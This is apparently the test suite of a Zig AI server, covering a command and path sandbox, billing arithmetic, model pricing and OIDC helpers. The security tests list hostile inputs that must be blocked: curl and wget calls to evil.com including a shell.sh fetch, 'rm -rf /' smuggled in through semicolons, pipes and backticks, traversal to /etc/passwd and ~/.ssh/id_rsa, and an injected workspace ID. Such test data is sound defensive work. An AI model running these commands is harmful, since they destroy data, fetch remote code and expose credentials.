// Test Suite — zig-ai-server
// Run: cd programs/zig_ai_server && zig build test
//
// Categories:
//   1. Security primitives (constant-time, path validation, command sandbox)
//   2. Store types (FixedString, hex encoding)
//   3. Billing math (cost estimation, tier margins, integer arithmetic)
//   4. Auth pipeline (token extraction, hash matching)
//   5. Models (CSV parsing, pricing lookup)

const std = @import("std");
const testing = std.testing;

// ── 1. Security Tests ───────────────────────────────────────

const security = @import("security.zig");

test "constant-time comparison: equal strings" {
    try testing.expect(security.constantTimeEql("hello", "hello"));
}

test "constant-time comparison: different strings" {
    try testing.expect(!security.constantTimeEql("hello", "world"));
}

test "constant-time comparison: different lengths" {
    try testing.expect(!security.constantTimeEql("short", "longer string"));
}

test "constant-time comparison: empty strings" {
    try testing.expect(security.constantTimeEql("", ""));
}

test "constant-time comparison: API key format" {
    const key = "qai_k_a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6";
    try testing.expect(security.constantTimeEql(key, key));
    try testing.expect(!security.constantTimeEql(key, "qai_k_wrong_key_00000000000000000000000000000000000000000000000000"));
}

test "path validation: relative path allowed" {
    try testing.expect(security.validatePath("src/main.zig") != null);
    try testing.expect(security.validatePath("hello.txt") != null);
    try testing.expect(security.validatePath("dir/sub/file.txt") != null);
}

test "path validation: absolute path blocked" {
    try testing.expect(security.validatePath("/etc/passwd") == null);
    try testing.expect(security.validatePath("/tmp/secret") == null);
}

test "path validation: traversal blocked" {
    try testing.expect(security.validatePath("../../../etc/passwd") == null);
    try testing.expect(security.validatePath("src/../../secret") == null);
    try testing.expect(security.validatePath("..") == null);
}

test "path validation: tilde blocked" {
    try testing.expect(security.validatePath("~/.ssh/id_rsa") == null);
}

test "path validation: null byte blocked" {
    try testing.expect(security.validatePath("file\x00.txt") == null);
}

test "path validation: backslash blocked" {
    try testing.expect(security.validatePath("dir\\file.txt") == null);
}

test "path validation: empty path blocked" {
    try testing.expect(security.validatePath("") == null);
}

test "path validation: strips leading ./" {
    const result = security.validatePath("./src/main.zig");
    try testing.expect(result != null);
    try testing.expectEqualStrings("src/main.zig", result.?);
}

test "command validation: safe commands allowed" {
    try testing.expect(security.validateCommand("ls -la") != null);
    try testing.expect(security.validateCommand("zig build") != null);
    try testing.expect(security.validateCommand("git status") != null);
    try testing.expect(security.validateCommand("cat file.txt") != null);
    try testing.expect(security.validateCommand("grep -r pattern src/") != null);
}

test "command validation: rm -rf / blocked" {
    try testing.expect(security.validateCommand("rm -rf /") == null);
    try testing.expect(security.validateCommand("rm -rf /*") == null);
}

test "command validation: sudo blocked" {
    try testing.expect(security.validateCommand("sudo apt install") == null);
}

test "command validation: curl blocked" {
    try testing.expect(security.validateCommand("curl http://evil.com") == null);
}

test "command validation: wget blocked" {
    try testing.expect(security.validateCommand("wget http://evil.com/shell.sh") == null);
}

test "command validation: curl after pipe blocked" {
    try testing.expect(security.validateCommand("echo hi | curl http://evil.com") == null);
}

test "command validation: reboot blocked" {
    try testing.expect(security.validateCommand("reboot") == null);
    try testing.expect(security.validateCommand("shutdown -h now") == null);
}

test "command validation: empty command blocked" {
    try testing.expect(security.validateCommand("") == null);
}

test "command validation: null byte blocked" {
    try testing.expect(security.validateCommand("ls\x00-la") == null);
}

test "workspace ID sanitization: valid IDs" {
    try testing.expect(security.sanitizeId("my-workspace") != null);
    try testing.expect(security.sanitizeId("test_123") != null);
    try testing.expect(security.sanitizeId("abc") != null);
}

test "workspace ID sanitization: traversal blocked" {
    try testing.expect(security.sanitizeId("../etc") == null);
    try testing.expect(security.sanitizeId("../../root") == null);
}

test "workspace ID sanitization: special chars blocked" {
    try testing.expect(security.sanitizeId("test;rm -rf /") == null);
    try testing.expect(security.sanitizeId("test space") == null);
    try testing.expect(security.sanitizeId("test/slash") == null);
}

test "workspace ID sanitization: empty/too long blocked" {
    try testing.expect(security.sanitizeId("") == null);
    const long = "a" ** 129;
    try testing.expect(security.sanitizeId(long) == null);
}

// ── 2. Store Types Tests ────────────────────────────────────

const types = @import("store/types.zig");

test "FixedStr32: from slice and back" {
    const fs = types.FixedStr32.fromSlice("hello");
    try testing.expectEqualStrings("hello", fs.slice());
}

test "FixedStr32: truncates long strings" {
    const long = "a" ** 100;
    const fs = types.FixedStr32.fromSlice(long);
    try testing.expectEqual(@as(u16, 32), fs.len);
}

test "FixedStr32: empty string" {
    const fs = types.FixedStr32.fromSlice("");
    try testing.expectEqual(@as(u16, 0), fs.len);
    try testing.expectEqualStrings("", fs.slice());
}

test "FixedStr32: equality check" {
    const fs = types.FixedStr32.fromSlice("test");
    try testing.expect(fs.eql("test"));
    try testing.expect(!fs.eql("other"));
}

test "hexEncode: known value" {
    var out: [4]u8 = undefined;
    types.hexEncode(&.{ 0xab, 0xcd }, &out);
    try testing.expectEqualStrings("abcd", &out);
}

test "hexEncode: zeros" {
    var out: [4]u8 = undefined;
    types.hexEncode(&.{ 0x00, 0x00 }, &out);
    try testing.expectEqualStrings("0000", &out);
}

test "hexEncode: full range" {
    var out: [2]u8 = undefined;
    types.hexEncode(&.{0xff}, &out);
    try testing.expectEqualStrings("ff", &out);
}

test "DevTier: margin basis points" {
    try testing.expectEqual(@as(u32, 3000), types.DevTier.free.marginBps());
    try testing.expectEqual(@as(u32, 2000), types.DevTier.hobby.marginBps());
    try testing.expectEqual(@as(u32, 1000), types.DevTier.pro.marginBps());
    try testing.expectEqual(@as(u32, 500), types.DevTier.enterprise.marginBps());
}

// ── 3. Billing Tests ────────────────────────────────────────

const billing = @import("billing.zig");

test "billing: cost estimation is positive" {
    const est = billing.estimateCost("deepseek-chat", 4096);
    try testing.expect(est > 0);
}

test "billing: actual cost integer arithmetic" {
    // DeepSeek: $0.28 input, $0.42 output per 1M tokens
    // 1000 input + 1000 output
    const cost = billing.actualCost("deepseek-chat", 1000, 1000, .free);
    try testing.expect(cost.cost > 0);
    try testing.expect(cost.margin > 0);
    // Free tier: 30% margin
    // margin should be ~30% of cost
    const expected_margin = @divFloor(cost.cost * 3000, 10000);
    try testing.expectEqual(expected_margin, cost.margin);
}

test "billing: enterprise margin is lower than free" {
    const free_cost = billing.actualCost("deepseek-chat", 10000, 10000, .free);
    const ent_cost = billing.actualCost("deepseek-chat", 10000, 10000, .enterprise);
    // Same base cost
    try testing.expectEqual(free_cost.cost, ent_cost.cost);
    // Enterprise margin should be lower
    try testing.expect(ent_cost.margin < free_cost.margin);
}

test "billing: zero tokens = zero cost" {
    const cost = billing.actualCost("deepseek-chat", 0, 0, .free);
    try testing.expectEqual(@as(i64, 0), cost.cost);
    try testing.expectEqual(@as(i64, 0), cost.margin);
}

test "billing: expensive model costs more" {
    const cheap = billing.actualCost("deepseek-chat", 1000, 1000, .free);
    const expensive = billing.actualCost("claude-opus-4-6", 1000, 1000, .free);
    try testing.expect(expensive.cost > cheap.cost);
}

// ── 4. Models Tests ─────────────────────────────────────────

const models = @import("models.zig");

test "models: count is reasonable" {
    try testing.expect(models.getModelCount() > 100);
}

test "models: pricing lookup for known model" {
    const pricing = models.getPricing("deepseek-chat");
    try testing.expect(pricing.input > 0);
    try testing.expect(pricing.output > 0);
}

test "models: pricing lookup for unknown model returns default" {
    const pricing = models.getPricing("nonexistent-model-xyz");
    // Should return default (3.0, 15.0)
    try testing.expectEqual(@as(f64, 3.0), pricing.input);
    try testing.expectEqual(@as(f64, 15.0), pricing.output);
}

test "models: claude pricing" {
    const pricing = models.getPricing("claude-sonnet-4-6");
    try testing.expectEqual(@as(f64, 3.0), pricing.input);
    try testing.expectEqual(@as(f64, 15.0), pricing.output);
}

// ── 5. Security Limits Tests ────────────────────────────────

test "limits: values are reasonable" {
    try testing.expect(security.Limits.max_chat_body <= 10 * 1024 * 1024);
    try testing.expect(security.Limits.max_agent_body <= 1 * 1024 * 1024);
    try testing.expect(security.Limits.max_messages <= 1000);
    try testing.expect(security.Limits.max_agent_iterations <= 100);
    try testing.expect(security.Limits.max_tokens_cap <= 1_000_000);
}

// ── 6. SHA-256 Key Hashing Tests ────────────────────────────

test "SHA-256: same input = same hash" {
    var hash1: [32]u8 = undefined;
    var hash2: [32]u8 = undefined;
    std.crypto.hash.sha2.Sha256.hash("qai_k_test123", &hash1, .{});
    std.crypto.hash.sha2.Sha256.hash("qai_k_test123", &hash2, .{});
    try testing.expect(std.mem.eql(u8, &hash1, &hash2));
}

test "SHA-256: different input = different hash" {
    var hash1: [32]u8 = undefined;
    var hash2: [32]u8 = undefined;
    std.crypto.hash.sha2.Sha256.hash("qai_k_key1", &hash1, .{});
    std.crypto.hash.sha2.Sha256.hash("qai_k_key2", &hash2, .{});
    try testing.expect(!std.mem.eql(u8, &hash1, &hash2));
}

// ── 7. OIDC / JWT Edge Cases ──────────────────────────────────
// Tests in oidc.zig are pulled in via import (base64url, nonce, JWKS parsing, etc.)

const oidc = @import("oidc.zig");

test "OIDC: nonce verification integration" {
    // Verify the public API works end-to-end
    try testing.expect(oidc.verifyNonce(null, null)); // no nonce = skip
    try testing.expect(!oidc.verifyNonce("secret", null)); // nonce required but missing
    try testing.expect(!oidc.verifyNonce("secret", "wrong")); // mismatch
}

test "OIDC: claims deinit with all fields" {
    var claims = oidc.VerifiedClaims{
        .sub = try testing.allocator.dupe(u8, "apple_001234"),
        .email = try testing.allocator.dupe(u8, "user@icloud.com"),
        .email_verified = true,
        .exp = 1712521781,
        .nonce = try testing.allocator.dupe(u8, "abc123"),
        .aud = try testing.allocator.dupe(u8, "com.quantumencoding.cosmicduck"),
    };
    claims.deinit(testing.allocator);
}

test "OIDC: JwksCache empty is stale" {
    const cache = oidc.JwksCache{};
    try testing.expect(cache.isStale(0));
    try testing.expect(cache.isStale(999999));
}

// ── 8. Billing Edge Cases ─────────────────────────────────────

test "billing: large token counts don't overflow" {
    // 1M tokens — should produce a valid positive result without overflow
    const cost = billing.actualCost("claude-opus-4-6", 1_000_000, 1_000_000, .free);
    try testing.expect(cost.cost > 0);
    try testing.expect(cost.margin > 0);
    try testing.expect(cost.margin < cost.cost); // margin < base cost
}

test "billing: estimation is always >= actual for same model" {
    // Estimate with max_tokens should be >= actual cost at max_tokens
    const max_tokens: u32 = 4096;
    const est = billing.estimateCost("deepseek-chat", max_tokens);
    const actual = billing.actualCost("deepseek-chat", max_tokens / 2, max_tokens, .free);
    // Estimation includes margin-like buffer, should be >= raw cost
    try testing.expect(est >= actual.cost);
}

test "billing: all tiers produce valid margins" {
    const tiers = [_]types.DevTier{ .free, .hobby, .pro, .enterprise };
    var prev_margin: i64 = std.math.maxInt(i64);
    for (tiers) |tier| {
        const cost = billing.actualCost("deepseek-chat", 10000, 10000, tier);
        try testing.expect(cost.cost > 0);
        try testing.expect(cost.margin >= 0);
        try testing.expect(cost.margin <= prev_margin); // higher tier = lower margin
        prev_margin = cost.margin;
    }
}

test "billing: unknown model uses default pricing" {
    const cost = billing.actualCost("nonexistent-model", 1000, 1000, .free);
    // Default pricing is claude-sonnet level (3.0/15.0)
    try testing.expect(cost.cost > 0);
}

test "billing: minimum reservation is 1000 ticks" {
    // Very cheap model with few tokens should still get minimum estimate
    const est = billing.estimateCost("deepseek-chat", 1);
    // At $0.28/1M, 1 token ≈ 0 ticks, but reservation floor is enforced in reserve()
    try testing.expect(est >= 0); // estimateCost itself may return 0
}

// ── 9. Store Types Edge Cases ─────────────────────────────────

test "FixedStr256: email-length strings" {
    const email = "very.long.email.address.with.many.parts@subdomain.domain.example.com";
    const fs = types.FixedStr256.fromSlice(email);
    try testing.expectEqualStrings(email, fs.slice());
}

test "FixedStr128: key name storage" {
    const name = "app-auth";
    const fs = types.FixedStr128.fromSlice(name);
    try testing.expectEqualStrings(name, fs.slice());
    try testing.expect(fs.eql("app-auth"));
    try testing.expect(!fs.eql("other-name"));
}

test "FixedStr32: account ID patterns" {
    // Apple account ID
    const apple_id = types.FixedStr32.fromSlice("apple_001234567890");
    try testing.expect(apple_id.eql("apple_001234567890"));

    // Google account ID
    const google_id = types.FixedStr32.fromSlice("google_109876543210");
    try testing.expect(google_id.eql("google_109876543210"));
}

test "FixedStr32: boundary at exactly 32 chars" {
    const exact = "a" ** 32;
    const fs = types.FixedStr32.fromSlice(exact);
    try testing.expectEqual(@as(u16, 32), fs.len);
    try testing.expectEqualStrings(exact, fs.slice());
}

test "DevTier: string round-trip" {
    try testing.expectEqualStrings("free", types.DevTier.free.toString());
    try testing.expectEqualStrings("hobby", types.DevTier.hobby.toString());
    try testing.expectEqualStrings("pro", types.DevTier.pro.toString());
    try testing.expectEqualStrings("enterprise", types.DevTier.enterprise.toString());
}

test "Role: string round-trip" {
    try testing.expectEqualStrings("user", types.Role.user.toString());
    try testing.expectEqualStrings("admin", types.Role.admin.toString());
    try testing.expectEqualStrings("service", types.Role.service.toString());
}

test "hexEncode: API key prefix format" {
    // Verify qai_k_ prefix generation matches expected pattern
    var out: [16]u8 = undefined;
    types.hexEncode(&.{ 0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe }, &out);
    try testing.expectEqualStrings("deadbeefcafebabe", &out);
}

// ── 10. Security Edge Cases ───────────────────────────────────

test "path validation: double dot in filename blocked (strict)" {
    // validatePath blocks ANY ".." substring — strict but safe
    // This prevents edge cases like "file..\\..\\etc"
    try testing.expect(security.validatePath("file..txt") == null);
}

test "path validation: deeply nested is OK" {
    try testing.expect(security.validatePath("a/b/c/d/e/f/g.txt") != null);
}

test "path validation: encoded traversal blocked" {
    // Some systems decode %2e%2e to ".." — our validator works on the raw string
    // but we should still catch literal ".." sequences
    try testing.expect(security.validatePath("..%2f..%2fetc%2fpasswd") == null);
}

test "command validation: pipe to rm blocked" {
    try testing.expect(security.validateCommand("echo test | rm -rf /") == null);
}

test "command validation: semicolon chain blocked" {
    try testing.expect(security.validateCommand("ls; rm -rf /") == null);
}

test "command validation: backtick injection blocked" {
    try testing.expect(security.validateCommand("echo `rm -rf /`") == null);
}
